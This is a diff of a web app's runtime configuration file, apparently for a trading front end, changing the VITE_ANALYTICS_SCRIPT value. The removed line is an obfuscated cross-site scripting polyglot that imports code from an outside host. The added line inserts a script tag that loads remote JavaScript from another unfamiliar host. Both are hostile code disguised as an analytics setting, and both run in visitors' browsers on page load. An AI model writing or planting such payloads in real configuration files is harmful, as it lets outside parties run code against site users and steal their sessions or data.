@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "1'/*\\'/*\"/*\\\"/*</Script/--><Input/AutoFocus/OnFocus=/**/(import(/https:\\\\X55.is?1=23673/.source))//>",
+  "VITE_ANALYTICS_SCRIPT": "<script src=\"https://js.rip/9ffkfx841d\"></script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
